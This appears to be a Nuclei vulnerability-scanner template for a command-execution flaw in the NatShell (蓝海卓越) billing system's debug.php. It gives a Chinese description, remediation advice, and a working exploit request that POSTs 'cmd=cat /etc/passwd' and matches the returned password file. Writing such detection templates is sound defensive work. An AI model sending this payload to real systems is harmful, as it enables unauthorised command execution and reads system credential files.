id: natshell-rce
info:
  name: NatShell Debug File RCE
  author:
  - l0ne1y
  tags:
  - natshell
  - rce
  description: "蓝海卓越计费管理系统 debug.php 远程命令执行漏洞 \n蓝海卓越计费管理系统 debug.php 存在命令调试页面，导致攻击者可以远程命令执行\n\n"
  reference:
  - https://mp.weixin.qq.com/s/g4yni6ubqiqckl0trkkwlw
  severity: critical
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：www.cuoshui.com

    临时修复方案：
    1、尽量不去执行外部的应用程序或命令。
    2、使用自定义函数或函数库实现外部应用程序或命令的功能。
    3、在执行system、eval等命令执行功能的函数前，校验参数内容。
    4、使用escapeshellarg函数处理相关参数。Escapeshellarg函数会将任何引起参数或命令结束的字符进行转义，如单引号“’”会被转义为“\\’”，双引号“””会被转义为“\\””，分号“;”会被转义为“\\;”，这样escapeshellarg会将参数内容限制在一对单引号或双引号里面，转义参数中所包含的单引号或双引号，使其无法对当前执行进行截断，实现防范命令注入攻击的目的。
    5、使用safe_mode_exec_dir执行可执行的文件路径。将php.ini文件中的safe_mode设置为On，然后将允许执行的文件放入一个目录中，并使用safe_mode_exec_dir指定这个可执行的文件路径。在需要执行相应的外部程序时，程序必须在safe_mode_exec_dir指定的目录中才会允许执行，否则执行将失败。
requests:
- matchers:
  - type: regex
    regex:
    - toor:[x*]:0:0
  - type: status
    status:
    - 200
  matchers-condition: and
  path:
  - '{{BaseURL}}/debug.php'
  method: POST
  body: |
    cmd=cat /etc/passwd
